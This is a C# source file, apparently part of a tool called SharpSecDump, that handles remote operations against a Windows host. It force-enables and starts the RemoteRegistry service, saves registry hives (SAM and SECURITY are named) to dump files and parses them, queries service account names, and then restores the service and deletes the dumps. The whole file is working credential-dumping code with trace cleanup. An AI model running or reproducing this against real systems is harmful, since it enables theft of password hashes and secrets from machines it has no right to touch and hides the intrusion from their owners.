using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace SharpSecDump
{
    class RemoteOps
    {
        //global vars used throughout the lifetime of a remote connection to a single system
        public string hostname;
        IntPtr scMgr = IntPtr.Zero;
        public IntPtr remoteRegHandle = IntPtr.Zero;
        int remoteRegistryInitialStatus = 0;
        bool remoteRegistryDisabled = false;

        public RemoteOps(string remoteHostname)
        {
            hostname = remoteHostname;
            StartRemoteRegistry();
        }

        private void StartRemoteRegistry()
        {
            IntPtr scMgrHandle = GetSCManagerHandle();
            if (scMgrHandle.Equals(IntPtr.Zero))
            {
                return;
            }
            IntPtr svcHandle = OpenService(scMgrHandle, "RemoteRegistry", 0xF01FF);

            //check to see if remote registry service is currently running on the remote system
            int bytesNeeded = 0;
            QueryServiceStatusEx(svcHandle, 0, IntPtr.Zero, 0, out bytesNeeded);
            IntPtr buf = Marshal.AllocHGlobal(bytesNeeded);
            int[] serviceStatus = new int[bytesNeeded];
            QueryServiceStatusEx(svcHandle, 0, buf, bytesNeeded, out bytesNeeded);
            Marshal.Copy(buf, serviceStatus, 0, serviceStatus.Length);
            remoteRegistryInitialStatus = serviceStatus[1];

            //if remote registry is not running, lets check to see if its also disabled
            if (remoteRegistryInitialStatus != 4)
            {
                bytesNeeded = 0;
                QueryServiceConfig(svcHandle, IntPtr.Zero, 0, ref bytesNeeded);
                IntPtr qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                QueryServiceConfig(svcHandle, qscPtr, bytesNeeded, ref bytesNeeded);
                QueryService serviceInfo = new QueryService(qscPtr);

                //if service is disabled, enable it
                if (serviceInfo.getStartType() == 4)
                {
                    uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
                    remoteRegistryDisabled = true;
                    ChangeServiceConfig(svcHandle, SERVICE_NO_CHANGE, 0x00000003, SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null);
                }
                if (StartService(svcHandle, 0, null) != true)
                {
                    Console.WriteLine("[X] Error - RemoteRegistry service failed to start on {0}", hostname);
                    CloseServiceHandle(svcHandle);
                    return;
                }
                else
                {
                    Console.WriteLine("[*] RemoteRegistry service started on {0}", hostname);
                }
            }
            else
            {
                Console.WriteLine("[*] RemoteRegistry service already started on {0}", hostname);
            }
            //done manipulating services for now, close handle + get a handle to HKLM on the remote registry we'll use for the other remote calls
            CloseServiceHandle(svcHandle);
            UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
            if (RegConnectRegistry(hostname, HKEY_LOCAL_MACHINE, out remoteRegHandle) != 0)
            {
                Console.WriteLine("[X] Error connecting to the remote registry on {0}", hostname);
            }
        }

        public IntPtr OpenRegKey(string key)
        {
            int KEY_MAXIMUM_ALLOWED = 0x02000000;
            IntPtr regKeyHandle;
            if (RegOpenKeyEx(remoteRegHandle, key, 0, KEY_MAXIMUM_ALLOWED, out regKeyHandle) == 0)
            {
                return regKeyHandle;
            }
            else
            {
                Console.WriteLine("[X] Error connecting to registry key: {0}", key);
                return IntPtr.Zero;
            }
        }

        public void CloseRegKey(IntPtr regKeyHandle)
        {
            if (RegCloseKey(regKeyHandle) != 0)
            {
                Console.WriteLine("[X] Error closing registry key handle");
            }
        }

        public bool SaveRegKey(string regKeyName, string fileOutName)
        {
            IntPtr regKeyHandle = OpenRegKey(regKeyName);
            if (RegSaveKey(regKeyHandle, fileOutName, IntPtr.Zero) == 0)
            {
                RegCloseKey(regKeyHandle);
                return true;
            }
            else
            {
                try
                {
                    RegCloseKey(regKeyHandle);
                }
                catch { }
                Console.WriteLine("[X] Error dumping hive to {0}", fileOutName);
                return false;
            }
        }

        public string GetRegKeyClassData(IntPtr regKeyHandle)
        {
            uint classLength = 1024;
            StringBuilder classData = new StringBuilder(1024);
            if (RegQueryInfoKey(regKeyHandle, classData, ref classLength, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0)
            {
                return classData.ToString();
            }
            else
            {
                Console.WriteLine("[X] Error getting registry key class data");
                return "";
            }
        }

        public RegistryHive GetRemoteHiveDump(string dumpfileName)
        {
            if (File.Exists(dumpfileName))
            {
                using (FileStream stream = File.OpenRead(dumpfileName))
                {
                    using (BinaryReader reader = new BinaryReader(stream))
                    {
                        reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
                        RegistryHive hive = new RegistryHive(reader);
                        return hive;
                    }
                }
            }
            else
            {
                Console.WriteLine("[X] Error unable to access hive dump file on the remote system at {0} -- manual cleanup may be needed", dumpfileName);
                return null;
            }
        }

        public string GetRegistryKeyValue(string registryKeyPath, string targetValue)
        {
            //this is used just to grab domain + computer names currently, both of which have a max length of 63
            int dataLength = 64;
            uint lpType;
            IntPtr retDataPtr = Marshal.AllocHGlobal(64);

            if (RegGetValue(remoteRegHandle, registryKeyPath, targetValue, 0x00000002, out lpType, retDataPtr, ref dataLength) == 0)
            {
                byte[] dataArr = new byte[dataLength];
                Marshal.Copy(retDataPtr, dataArr, 0, dataLength);
                string retVal = Encoding.Unicode.GetString(dataArr);
                //remove trailing null-byte from val
                retVal = retVal.Remove(retVal.Length - 1, 1);
                return retVal;
            }
            else
            {
                return "unknown";
            }
        }

        private IntPtr GetSCManagerHandle()
        {
            if (scMgr.Equals(IntPtr.Zero))
            {
                //this can time out / be slow on systems where RPC/TCP is not allowed (named pipe usage required), dont have a great workaround yet
                //https://docs.microsoft.com/en-us/windows/win32/services/services-and-rpc-tcp
                //timeout set to 24s so we can hit 21s breakpoint for RPC/TCP to fall back to RPC/NP +3s for any connection latency

                //https://stackoverflow.com/questions/13513650/how-to-set-timeout-for-a-line-of-c-sharp-code
                IAsyncResult result;
                Action action = () =>
                {
                    scMgr = OpenSCManager(hostname, null, 0xF003F);
                };
                result = action.BeginInvoke(null, null);
                result.AsyncWaitHandle.WaitOne(24000);

                if (scMgr.Equals(IntPtr.Zero))
                {
                    Console.WriteLine("[X] Error, unable to bind to service manager on {0}", hostname);
                }
                return scMgr;
            }
            else
            {
                return scMgr;
            }
        }

        public string GetServiceStartname(string targetService)
        {
            IntPtr scMgrHandle = GetSCManagerHandle();
            IntPtr svcHandle = OpenService(scMgrHandle, targetService, 0x00000001);
            if (!(svcHandle.Equals(IntPtr.Zero)))
            {
                int bytesNeeded = 0;
                //we're going to get a fail on this one because buffer size is 0, just need to make this call to get the out val of bytesNeeded to we can allocate the right amount of memory
                QueryServiceConfig(svcHandle, IntPtr.Zero, 0, ref bytesNeeded);
                IntPtr qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                if (QueryServiceConfig(svcHandle, qscPtr, bytesNeeded, ref bytesNeeded))
                {
                    QueryService serviceInfo = new QueryService(qscPtr);
                    string startName = serviceInfo.getStartName();
                    CloseServiceHandle(svcHandle);
                    return startName;
                }
                else
                {
                    CloseServiceHandle(svcHandle);
                }
            }
            return "unknownUser";
        }

        //ran after all processing on a remote host is complete to restore remote registry to initial status + delete dump files
        public void Cleanup(string remoteSAM, string remoteSecurity)
        {
            RegCloseKey(remoteRegHandle);
            bool successfulCleanup = true;
            IntPtr svcHandle = OpenService(scMgr, "RemoteRegistry", 0xF01FF);
            if (remoteRegistryDisabled == true)
            {
                uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
                if (ChangeServiceConfig(svcHandle, SERVICE_NO_CHANGE, 0x00000004, SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null) != true)
                {
                    Console.WriteLine("[X] Error resetting RemoteRegistry service to disabled {0}, follow-up action may be required", hostname);
                    successfulCleanup = false;
                }
            }
            if (remoteRegistryInitialStatus != 4)
            {
                uint serviceStatus = 0;
                if (ControlService(svcHandle, 0x00000001, ref serviceStatus) != true)
                {
                    Console.WriteLine("[X] Error stopping RemoteRegistry service on {0}, follow-up action may be required", hostname);
                    successfulCleanup = false;
                }
            }
            CloseServiceHandle(svcHandle);
            CloseServiceHandle(scMgr);
            if (remoteSAM != null)
            {
                try
                {
                    File.Delete(remoteSAM);
                }
                catch
                {
                    Console.WriteLine("[X] Error deleting SAM dump file {0} -- manual cleanup may be needed", remoteSAM);
                    successfulCleanup = false;
                }
            }
            if (remoteSecurity != null)
            {
                try
                {
                    File.Delete(remoteSecurity);
                }
                catch
                {
                    Console.WriteLine("[X] Error deleting SECURITY dump file {0} -- manual cleanup may be needed", remoteSecurity);
                    successfulCleanup = false;
                }
            }
            if (successfulCleanup == true)
            {
                Console.WriteLine("[*] Sucessfully cleaned up on {0}", hostname);
            }
            else
            {
                Console.WriteLine("[X] Cleanup completed with errors on {0}", hostname);
            }
        }



        //////////////registry interaction imports//////////////
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegOpenKeyExW", SetLastError = true)]
        public static extern int RegOpenKeyEx(IntPtr hKey, string subKey, uint options, int sam, out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(IntPtr hKey);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int RegQueryInfoKey(IntPtr hKey, [Out()] StringBuilder lpClass, ref uint lpcchClass,
           IntPtr lpReserved, IntPtr lpcSubkey, IntPtr lpcchMaxSubkeyLen,
           IntPtr lpcchMaxClassLen, IntPtr lpcValues, IntPtr lpcchMaxValueNameLen,
           IntPtr lpcbMaxValueLen, IntPtr lpSecurityDescriptor, IntPtr lpftLastWriteTime);

        [DllImport("advapi32")]
        static extern int RegSaveKey(IntPtr hKey, string fileout, IntPtr secdesc);

        [DllImport("advapi32")]
        static extern int RegConnectRegistry(string machine, UIntPtr hKey, out IntPtr pRemKey);

        [DllImport("Advapi32.dll", EntryPoint = "RegGetValueW", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern Int32 RegGetValue(IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags, out uint pdwType, IntPtr pvData, ref Int32 pcbData);


        //////////////service interaction imports//////////////
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenService(IntPtr hSCManager, String lpServiceName, UInt32 dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, int cbBufSize, ref int pcbBytesNeeded);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool QueryServiceStatusEx(IntPtr serviceHandle, int infoLevel, IntPtr buffer, int bufferSize, out int bytesNeeded);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean ChangeServiceConfig(IntPtr hService, UInt32 nServiceType, UInt32 nStartType, UInt32 nErrorControl, String lpBinaryPathName,
        String lpLoadOrderGroup, IntPtr lpdwTagId, [In] char[] lpDependencies, String lpServiceStartName, String lpPassword, String lpDisplayName);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ControlService(IntPtr hService, uint dwControl, ref uint lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);
    }
}
